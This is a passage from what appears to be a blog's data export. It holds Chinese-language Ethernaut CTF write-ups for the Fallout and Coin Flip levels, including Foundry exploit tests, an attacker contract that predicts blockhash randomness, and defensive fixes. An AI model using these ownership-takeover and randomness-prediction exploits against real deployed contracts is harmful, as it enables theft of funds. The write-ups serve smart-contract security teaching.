<code>Fal1out()</code> 成为 <code>owner</code></li>\n<li><strong>验证权限获取</strong> - 确认已获得合约控制权</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallout.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FalloutTest is Test &#123;</span><br><span class=\"line\">    Fallout public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        instance = new Fallout();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给攻击者一些初始资金</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFalloutExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Original owner:&quot;, instance.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击步骤：直接调用错误命名的&quot;构造函数&quot;</span><br><span class=\"line\">        instance.Fal1out&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, instance.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testOriginalOwnerIsZero() public view &#123;</span><br><span class=\"line\">        // 验证合约部署后没有owner（因为构造函数未执行）</span><br><span class=\"line\">        assertEq(instance.owner(), address(0));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Fallout 关卡测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FalloutTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预期输出：</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testFalloutExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testOriginalOwnerIsZero()</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"现代-Solidity-解决方案\"><a href=\"#现代-Solidity-解决方案\" class=\"headerlink\" title=\"现代 Solidity 解决方案\"></a>现代 Solidity 解决方案</h3><p>从 <strong>Solidity 0.4.22</strong> 开始，引入了 <code>constructor</code> 关键字：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureFallout &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ✅ 使用 constructor 关键字</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 其他函数...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安全最佳实践\"><a href=\"#安全最佳实践\" class=\"headerlink\" title=\"安全最佳实践\"></a>安全最佳实践</h3><ol>\n<li><p><strong>使用现代语法</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 旧版本（容易出错）</span><br><span class=\"line\">function ContractName() public &#123;</span><br><span class=\"line\">    // 构造逻辑</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 新版本（明确且安全）</span><br><span class=\"line\">constructor() &#123;</span><br><span class=\"line\">    // 构造逻辑</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>代码审计检查清单</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检查项目：</span><br><span class=\"line\">// ✅ 构造函数名称与合约名称是否完全匹配</span><br><span class=\"line\">// ✅ 是否使用了现代 constructor 语法</span><br><span class=\"line\">// ✅ 是否有多个类似构造函数的函数</span><br><span class=\"line\">// ✅ 权限初始化是否正确执行</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>编译器警告</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 现代编译器会对可疑的函数名发出警告</span></span><br><span class=\"line\">Warning: Function state mutability can be restricted to pure</span><br><span class=\"line\">Warning: This <span class=\"keyword\">function</span> has the same name as the contract</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-Solidity-版本演进\"><a href=\"#1-Solidity-版本演进\" class=\"headerlink\" title=\"1. Solidity 版本演进\"></a>1. Solidity 版本演进</h3><table>\n<thead>\n<tr>\n<th>版本</th>\n<th>构造函数语法</th>\n<th>安全性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt; 0.4.22</td>\n<td><code>function ContractName()</code></td>\n<td>❌ 容易拼写错误</td>\n</tr>\n<tr>\n<td>&gt;&#x3D; 0.4.22</td>\n<td><code>constructor()</code></td>\n<td>✅ 明确且安全</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-常见命名错误\"><a href=\"#2-常见命名错误\" class=\"headerlink\" title=\"2. 常见命名错误\"></a>2. 常见命名错误</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MyContract &#123;</span><br><span class=\"line\">    // ❌ 常见错误类型</span><br><span class=\"line\">    function MyContracr() public &#123; &#125;  // 拼写错误</span><br><span class=\"line\">    function myContract() public &#123; &#125;  // 大小写错误</span><br><span class=\"line\">    function MyContract_() public &#123; &#125; // 多余字符</span><br><span class=\"line\">    function MyContract() public &#123; &#125;  // 可能正确，但不推荐</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-代码审计重点\"><a href=\"#3-代码审计重点\" class=\"headerlink\" title=\"3. 代码审计重点\"></a>3. 代码审计重点</h3><ul>\n<li><strong>字符相似性检查</strong> - 1 vs l, 0 vs O</li>\n<li><strong>大小写敏感性</strong> - Solidity 区分大小写</li>\n<li><strong>额外字符检查</strong> - 下划线、空格等</li>\n<li><strong>编码问题</strong> - Unicode 字符混用</li>\n</ul>\n<h2 id=\"🔍-实际案例分析\"><a href=\"#🔍-实际案例分析\" class=\"headerlink\" title=\"🔍 实际案例分析\"></a>🔍 实际案例分析</h2><h3 id=\"历史上的类似漏洞\"><a href=\"#历史上的类似漏洞\" class=\"headerlink\" title=\"历史上的类似漏洞\"></a>历史上的类似漏洞</h3><ol>\n<li><p><strong>Rubixi 智能合约</strong> (2016)</p>\n<ul>\n<li>合约从 <code>DynamicPyramid</code> 重命名为 <code>Rubixi</code></li>\n<li>忘记更新构造函数名称</li>\n<li>导致任何人都可以成为 owner</li>\n</ul>\n</li>\n<li><p><strong>其他类似案例</strong></p>\n<ul>\n<li>复制粘贴代码时忘记修改函数名</li>\n<li>团队协作中的沟通失误</li>\n<li>自动化重构工具的缺陷</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"漏洞影响评估\"><a href=\"#漏洞影响评估\" class=\"headerlink\" title=\"漏洞影响评估\"></a>漏洞影响评估</h3><ul>\n<li><strong>直接影响</strong>: 完全丧失合约控制权</li>\n<li><strong>资金风险</strong>: 合约中的所有资金</li>\n<li><strong>修复难度</strong>: 无法修复，需要重新部署</li>\n<li><strong>检测难度</strong>: 极低，但容易被忽视</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Fallout 关卡展示了一个看似微不足道但后果严重的漏洞：</p>\n<ul>\n<li>✅ <strong>细节决定成败</strong> - 一个字符的差异导致完全不同的结果</li>\n<li>✅ <strong>工具的重要性</strong> - 现代编译器和工具可以避免此类错误</li>\n<li>✅ <strong>代码审计的价值</strong> - 人工审计能发现工具遗漏的问题</li>\n<li>✅ <strong>版本升级的必要性</strong> - 使用最新的安全特性</li>\n</ul>\n<p>这个案例提醒我们，在智能合约开发中，<strong>没有小错误，只有大损失</strong>。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">上一关: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">下一关: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>魔鬼藏在细节中，安全始于每一个字符。</em> 🔍</p>\n"},{"title":"Ethernaut Level 3: Coin Flip - 伪随机数攻击详解","date":"2025-01-25T06:40:00.000Z","updated":"2025-01-25T06:40:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入理解区块链伪随机数的安全隐患，学习如何利用区块链的确定性特征预测随机数，掌握真正的随机数生成方案。","_content":"\n# 🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解\n\n> **关卡链接**: [Ethernaut Level 3 - Coin Flip](https://ethernaut.openzeppelin.com/level/3)  \n> **攻击类型**: 伪随机数预测攻击  \n> **难度**: ⭐⭐⭐☆☆  \n> **核心概念**: 区块链确定性、可预测性\n\n## 📋 挑战目标\n\n这个关卡考验对区块链随机数机制的理解：\n\n1. **连续猜对10次** - 连续正确预测硬币正反面\n2. **理解伪随机数** - 掌握区块链\"随机数\"的本质\n3. **学习预测技术** - 利用区块链的确定性进行攻击\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    // 🚨 关键漏洞：使用可预测的区块哈希\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n    \n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    // 🚨 伪随机数生成逻辑\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n### 漏洞识别\n\n**伪随机数的根本缺陷**：\n\n1. **数据源可预测** - `blockhash(block.number - 1)` 是公开可查的\n2. **算法透明** - 随机数生成算法完全公开\n3. **确定性计算** - 相同输入必然产生相同输出\n\n**攻击原理**：\n\n```solidity\n// 合约使用的\"随机数\"生成\nuint256 blockValue = uint256(blockhash(block.number - 1));\nuint256 coinFlip = blockValue / FACTOR;\nbool side = coinFlip == 1 ? true : false;\n\n// 攻击者可以在同一个区块内执行相同计算\n// 由于使用相同的 blockhash，结果必然相同！\n```\n\n### 攻击流程\n\n1. **获取当前区块哈希** - 读取 `blockhash(block.number - 1)`\n2. **执行相同计算** - 使用相同的算法计算结果\n3. **提前知道答案** - 在调用 `flip()` 前就知道正确答案\n4. **提交正确猜测** - 保证100%胜率\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/CoinFlip.sol\";\n\ncontract CoinFlipAttacker {\n    CoinFlip public target;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    \n    constructor(address _target) {\n        target = CoinFlip(_target);\n    }\n    \n    function attack() public {\n        // 🎯 关键：在同一区块内执行相同的计算\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        // 提交预先计算好的答案\n        target.flip(side);\n    }\n}\n\ncontract CoinFlipTest is Test {\n    CoinFlip public coinFlip;\n    CoinFlipAttacker public attacker;\n    \n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        coinFlip = new CoinFlip();\n        \n        // 部署攻击合约\n        vm.prank(attackerAddr);\n        attacker = new CoinFlipAttacker(address(coinFlip));\n    }\n\n    function testCoinFlipExploit() public {\n        console.log(\"Initial consecutive wins:\", coinFlip.consecutiveWins());\n        \n        vm.startPrank(attackerAddr);\n        \n        // 连续攻击10次以获得10连胜\n        for (uint i = 0; i < 10; i++) {\n            // 模拟新区块（每次攻击都在新区块进行）\n            vm.roll(block.number + 1);\n            \n            uint256 winsBefore = coinFlip.consecutiveWins();\n            attacker.attack();\n            uint256 winsAfter = coinFlip.consecutiveWins();\n            \n            console.log(\"Round\", i + 1, \"- Wins:\", winsAfter);\n            \n            // 验证每次攻击都成功\n            assertEq(winsAfter, winsBefore + 1);\n        }\n        \n        vm.stopPrank();\n        \n        // 验证最终达成10连胜\n        assertEq(coinFlip.consecutiveWins(), 10);\n        console.log(\"Attack successful! 10 consecutive wins achieved.\");\n    }\n    \n    function testPredictability() public view {\n        // 演示随机数的可预测性\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        console.log(\"Block hash:\", blockValue);\n        console.log(\"Coin flip result:\", side);\n        console.log(\"This result is 100% predictable!\");\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Coin Flip 攻击测试\nforge test --match-contract CoinFlipTest -vvv\n\n# 预期输出：\n# [PASS] testCoinFlipExploit()\n# Round 1 - Wins: 1\n# Round 2 - Wins: 2\n# ...\n# Round 10 - Wins: 10\n# Attack successful! 10 consecutive wins achieved.\n```\n\n## 🛡️ 防御措施\n\n### 1. 使用 Chainlink VRF (推荐)\n\n```solidity\nimport \"@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol\";\nimport \"@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol\";\n\ncontract SecureCoinFlip is VRFConsumerBaseV2 {\n    VRFCoordinatorV2Interface COORDINATOR;\n    \n    uint64 s_subscriptionId;\n    bytes32 keyHash;\n    uint32 callbackGasLimit = 100000;\n    uint16 requestConfirmations = 3;\n    uint32 numWords = 1;\n    \n    mapping(uint256 => address) public requestIdToSender;\n    \n    constructor(uint64 subscriptionId, address vrfCoordinator) \n        VRFConsumerBaseV2(vrfCoordinator) {\n        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);\n        s_subscriptionId = subscriptionId;\n    }\n    \n    function flip(bool _guess) public {\n        // 请求真正的随机数\n        uint256 requestId = COORDINATOR.requestRandomWords(\n            keyHash,\n            s_subscriptionId,\n            requestConfirmations,\n            callbackGasLimit,\n            numWords\n        );\n        \n        requestIdToSender[requestId] = msg.sender;\n        // 存储用户的猜测...\n    }\n    \n    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) \n        internal override {\n        // 使用真正的随机数处理结果\n        bool side = (randomWords[0] % 2) == 1;\n        address sender = requestIdToSender[requestId];\n        \n        // 处理游戏逻辑...\n    }\n}\n```\n\n### 2. 使用未来区块哈希 + 提交-揭示方案\n\n```solidity\ncontract CommitRevealCoinFlip {\n    struct Game {\n        bytes32 commitment;\n        uint256 revealBlock;\n        bool revealed;\n    }\n    \n    mapping(address => Game) public games;\n    \n    function commitFlip(bytes32 _commitment) public {\n        games[msg.sender] = Game({\n            commitment: _commitment,\n            revealBlock: block.number + 10, // 10个区块后才能揭示\n            revealed: false\n        });\n    }\n    \n    function revealFlip(bool _guess, uint256 _nonce) public {\n        Game storage game = games[msg.sender];\n        \n        require(block.number >= game.revealBlock, \"Too early to reveal\");\n        require(!game.revealed, \"Already revealed\");\n        \n        // 验证承诺\n        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));\n        require(hash == game.commitment, \"Invalid commitment\");\n        \n        // 使用未来区块哈希\n        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));\n        bool result = (futureBlockHash % 2) == 1;\n        \n        game.revealed = true;\n        \n        // 处理结果...\n    }\n}\n```\n\n### 3. 多源熵组合\n\n```solidity\ncontract MultiSourceRandom {\n    uint256 private nonce;\n    \n    function getRandomNumber() private returns (uint256) {\n        // ⚠️ 仍不够安全，仅作教学示例\n        nonce++;\n        return uint256(keccak256(abi.encodePacked(\n            block.difficulty,    // 矿工可操控\n            block.timestamp,     // 矿工可小幅操控\n            msg.sender,\n            nonce,\n            blockhash(block.number - 1)\n        )));\n    }\n}\n```\n\n## 📚 核心知识点\n\n### 1. 区块链随机数常见误区\n\n| 数据源 | 安全性 | 操控难度 | 推荐使用 |\n|--------|---------|----------|----------|\n| `block.timestamp` | ❌ 极低 | 容易 | 否 |\n| `block.difficulty` | ❌ 低 | 中等 | 否 |\n| `blockhash` | ❌ 低 | 困难 | 否 |\n| `keccak256(组合)` | ❌ 低 | 取决于组合 | 否 |\n| **Chainlink VRF** | ✅ 高 | 极困难 | **是** |\n\n### 2. 攻击者的优势\n\n```solidity\n// 攻击者可以：\n// 1. 在同一交易中执行相同计算\n// 2. 预先验证结果，只在有利时提交\n// 3. 使用合约自动化攻击\n\ncontract SmartAttacker {\n    function conditionalAttack(CoinFlip target, bool guess) public {\n        // 预先计算\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool predictedSide = coinFlip == 1 ? true : false;\n        \n        // 只在预测正确时才攻击\n        if (predictedSide == guess) {\n            target.flip(guess);\n        }\n        // 否则什么都不做，等待下一个有利机会\n    }\n}\n```\n\n### 3. 真随机数 vs 伪随机数\n\n```solidity\n// ❌ 伪随机数（确定性）\nfunction badRandom() public view returns (uint256) {\n    return uint256(keccak256(abi.encodePacked(\n        block.timestamp,\n        block.difficulty,\n        msg.sender\n    )));\n}\n\n// ✅ 真随机数（使用预言机）\nfunction goodRandom() public {\n    // 通过 Chainlink VRF 请求真正的随机数\n    requestRandomness(keyHash, fee);\n}\n```\n\n## 🏛️ 历史案例\n\n### 著名的随机数攻击事件\n\n1. **SmartBillions** (2017)\n   - 损失: 400 ETH\n   - 原因: 使用 `block.blockhash` 作为随机源\n   - 攻击: 预测未来区块哈希\n\n2. **Fomo3D** (2018)\n   - 影响: 游戏机制被操控\n   - 原因: 使用可预测的时间戳\n   - 后果: 奖池分配不公\n\n3. **TheRun** (2019)\n   - 损失: 大量代币\n   - 原因: 复杂但仍可预测的随机数算法\n\n## 🎯 总结\n\nCoin Flip 关卡揭示了区块链随机数的根本问题：\n\n- ✅ **区块链是确定性系统** - 相同输入必然产生相同输出\n- ✅ **透明性带来可预测性** - 所有数据都是公开的\n- ✅ **真随机数需要外部熵源** - 必须依赖链下随机性\n- ✅ **预言机是最佳解决方案** - Chainlink VRF 等服务\n\n这个看似简单的猜硬币游戏，实际上涉及密码学、概率论和分布式系统的深层概念。理解其原理对于构建安全的智能合约至关重要。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[下一关: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[Chainlink VRF 文档](https://docs.chain.link/vrf/v2/introduction)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*在区块链的确定性世界中，真正的随机性是一种珍贵的资源。* 🎲","source":"_posts/ethernaut-level-03-coinflip.md","raw":"---\ntitle: 'Ethernaut Level 3: Coin Flip - 伪随机数攻击详解'\ndate: 2025-01-25 14:40:00\nupdated: 2025-01-25 14:40:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - 伪随机数\n  - 可预测性攻击\n  - 智能合约安全\n  - Solidity\n  - 区块链透明性\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入理解区块链伪随机数的安全隐患，学习如何利用区块链的确定性特征预测随机数，掌握真正的随机数生成方案。\"\n---\n\n# 🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解\n\n> **关卡链接**: [Ethernaut Level 3 - Coin Flip](https://ethernaut.openzeppelin.com/level/3)  \n> **攻击类型**: 伪随机数预测攻击  \n> **难度**: ⭐⭐⭐☆☆  \n> **核心概念**: 区块链确定性、可预测性\n\n## 📋 挑战目标\n\n这个关卡考验对区块链随机数机制的理解：\n\n1. **连续猜对10次** - 连续正确预测硬币正反面\n2. **理解伪随机数** - 掌握区块链\"随机数\"的本质\n3. **学习预测技术** - 利用区块链的确定性进行攻击\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    // 🚨 关键漏洞：使用可预测的区块哈希\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n    \n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    // 🚨 伪随机数生成逻辑\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n### 漏洞识别\n\n**伪随机数的根本缺陷**：\n\n1. **数据源可预测** - `blockhash(block.number - 1)` 是公开可查的\n2. **算法透明** - 随机数生成算法完全公开\n3. **确定性计算** - 相同输入必然产生相同输出\n\n**攻击原理**：\n\n```solidity\n// 合约使用的\"随机数\"生成\nuint256 blockValue = uint256(blockhash(block.number - 1));\nuint256 coinFlip = blockValue / FACTOR;\nbool side = coinFlip == 1 ? true : false;\n\n// 攻击者可以在同一个区块内执行相同计算\n// 由于使用相同的 blockhash，结果必然相同！\n```\n\n### 攻击流程\n\n1. **获取当前区块哈希** - 读取 `blockhash(block.number - 1)`\n2. **执行相同计算** - 使用相同的算法计算结果\n3. **提前知道答案** - 在调用 `flip()` 前就知道正确答案\n4. **提交正确猜测** - 保证100%胜率\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/CoinFlip.sol\";\n\ncontract CoinFlipAttacker {\n    CoinFlip public target;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    \n    constructor(address _target) {\n        target = CoinFlip(_target);\n    }\n    \n    function attack() public {\n        // 🎯 关键：在同一区块内执行相同的计算\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        // 提交预先计算好的答案\n        target.flip(side);\n    }\n}\n\ncontract CoinFlipTest is Test {\n    CoinFlip public coinFlip;\n    CoinFlipAttacker public attacker;\n    \n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        coinFlip = new CoinFlip();\n        \n        // 部署攻击合约\n        vm.prank(attackerAddr);\n        attacker = new CoinFlipAttacker(address(coinFlip));\n    }\n\n    function testCoinFlipExploit() public {\n        console.log(\"Initial consecutive wins:\", coinFlip.consecutiveWins());\n        \n        vm.startPrank(attackerAddr);\n        \n        // 连续攻击10次以获得10连胜\n        for (uint i = 0; i < 10; i++) {\n            // 模拟新区块（每次攻击都在新区块进行）\n            vm.roll(block.number + 1);\n            \n            uint256 winsBefore = coinFlip.consecutiveWins();\n            attacker.attack();\n            uint256 winsAfter = coinFlip.consecutiveWins();\n            \n            console.log(\"Round\", i + 1, \"- Wins:\", winsAfter);\n            \n            // 验证每次攻击都成功\n            assertEq(winsAfter, winsBefore + 1);\n        }\n        \n        vm.stopPrank();\n        \n        // 验证最终达成10连胜\n        assertEq(coinFlip.consecutiveWins(), 10);\n        console.log(\"Attack successful! 10 consecutive wins achieved.\");\n    }\n    \n    function testPredictability() public view {\n        // 演示随机数的可预测性\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        console.log(\"Block hash:\", blockValue);\n        console.log(\"Coin flip result:\", side);\n        console.log(\"This result is 100% predictable!\");\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Coin Flip 攻击测试\nforge test --match-contract CoinFlipTest -vvv\n\n# 预期输出：\n# [PASS] testCoinFlipExploit()\n# Round 1 - Wins: 1\n# Round 2 - Wins: 2\n# ...\n# Round 10 - Wins: 10\n# Attack successful! 10 consecutive wins achieved.\n```\n\n## 🛡️ 防御措施\n\n### 1. 使用 Chainlink VRF (推荐)\n\n```solidity\nimport \"@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol\";\nimport 